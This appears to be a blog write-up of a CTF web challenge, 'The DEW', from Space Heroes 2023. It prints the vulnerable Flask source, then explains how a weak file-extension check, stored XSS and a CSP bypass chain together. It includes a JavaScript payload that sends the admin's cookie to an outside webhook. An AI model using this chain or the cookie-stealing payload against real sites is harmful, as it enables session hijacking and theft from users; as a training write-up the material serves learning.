---
title: Space Heroes 2023 Megathread
date: 2023-04-23
description: Collection of writeups from the Space Heroes 2023 CTF
tags: [writeups, ctfs]
---

This CTF I played with `Space Heroes International Team`, a team consisting mostly of people in ARESx and some from Emu Exploit. We placed 2nd place in open division and 1st place in the student division!

I had a lot of fun in this CTF and am looking forward to it next year!

This won't be a list of all the challenges I solved, just ones I think were really cool and would be fun to do a writeup for.

# The DEW

{{< zoom-img src="img/the-dew-chall.png" >}}

From exploring the site, we find two interesting functionalities, being able to upload images and a comment system.

Messing with the comment system a bit we find that it's vulnerable to XSS, although what good is XSS without an admin bot?

Looking at the source of the page, we find a comment pointing us to the `/source` path.

{{< zoom-img src="img/the-dew-html-source.png" >}}

Going to this path gives us the python flask script running on the server

```python
#https://www.w3schools.com/howto/howto_css_blog_layout.asp
#https://flask.palletsprojects.com/en/latest/patterns/fileuploads/
import os
import redis
import subprocess
from uuid import uuid4
from flask import *
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename

UPLOAD_FOLDER = os.path.abspath('../') + '/images/'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

app = Flask(__name__)

limiter = Limiter(
	get_remote_address,
	app=app,
	default_limits=["30 per minute"]
)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SECRET_KEY'] = 'secret!'

socketio = SocketIO(app)

comments = []

def allowed_file(filename):
   return '.' in filename and filename.rsplit('.')[1].lower() in ALLOWED_EXTENSIONS

@app.after_request
def add_security_headers(resp):
	resp.headers['Content-Security-Policy']="default-src 'self' https://*.jquery.com https://*.cloudflare.com;  object-src 'none';"
	return resp

@socketio.on('submit comment')
def handle_comment(data):
	comments.append("<p class=\"comment\"><strong>" + data['author'] + ":</strong> " + data['comment'] + "</p>");
	emit('new comment', broadcast=True)

@socketio.on('waive admin')
def waive_admin():
	subprocess.run(['python','admin.py'])

@app.route('/', methods=['GET'])
def news():
	if 'flag' in request.cookies:
		return render_template('/news.html', comments=comments)
	else:
		resp = make_response(render_template('/news.html', comments=comments))
		resp.set_cookie('flag','if only you were the admin lol')
		return resp

@app.route('/upload', methods=['GET','POST'])
def upload():
	if request.method == 'POST':
		if 'file' not in request.files:
			flash('No file part')
			return render_template('/upload.html',message='No file uploaded :(')
		file = request.files['file']
		if not file:
			flash('No file data')
			return render_template('/upload.html',message='No file uploaded :(')
		if file.filename == '':
			flash('No selected file')
			return render_template('/upload.html',message='Filename can\'t be empty, silly!')
		if allowed_file(file.filename):
			filename = session['uuid'] + secure_filename(file.filename)
			print(filename)
			file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
			return render_template('/upload.html',message=f'Image uploaded successfully to /images/{filename}!')
		else:
			return render_template('/upload.html',message='Bad file type detected! Only .png, .jpg, .jpeg, and .gif allowed!')
	return render_template('/upload.html')

@app.route('/images/<name>', methods=['GET'])
def download_file(name):
	return send_from_directory(app.config["UPLOAD_FOLDER"], name)


@app.route('/source',methods=['GET'])
def show_source():
	return render_template('server_code.py')

if __name__=='__main__':
	app.run(host="0.0.0.0",port=31337)
```

Theres a decent bit going on in this script so I'll just point out he interesting parts.

The first interesting bit of code is the `allowed_file` function.
```python
def allowed_file(filename):
   return '.' in filename and filename.rsplit('.')[1].lower() in ALLOWED_EXTENSIONS
```

This function doesn't properly check the extension because it makes the assumption the uploaded file will only have one dot. If we were to input something like `bad.png.js` our fille will still be uploaded since it only checks if the `png` is in `ALLOWED_EXTENSIONS`

This seems bad, but so far theres no way to get the flag just with this vulnerability. We're going to need to look for more to chain.

The next interesting functionality in this script is the `waive_admin` function.
```python
@socketio.on('waive admin')
def waive_admin():
	subprocess.run(['python','admin.py'])
```

We're not given the source of admin, so I made an educated guess that it would visit the homepage, with the flag cookie being actually set to the flag. I'm not really a fan of having to guess that it would do this, but I didn't see any way to look into admin.py so it was my only option.

## CSP?

Now that we know there is an admin bot that can read the comments we put, and we also know that the comments are vulnerable to XSS, the final exploit should be easy right? Not quite. The page has CSP set so that scripts can only come from `self`, `https://*.jquery.com`, or `https://*.cloudflare.com`. So if we can't just wrap our exploit in the script tag, what can we do? That's where our file upload vulnerability comes into play.

We are able to upload our malicious JS script onto the server, allowed it to be served by the website itself and therefore getting around the CSP set in place.

## The final chain

First we upload our malicous JS script to the server.
```js
document.location="<webhook url>?"+document.cookie;
```
Then we submit our comment with this payload
```html
<script src="/images/<file name>"></script>
```
Then press the `waive admin` button and we'll see the flag in our webhook logs.

{{< zoom-img src="img/the-dew-webhook-result.png" >}}

Flag: `shctf{w3_a11_l1v3_und3r_th3_DOMe}`
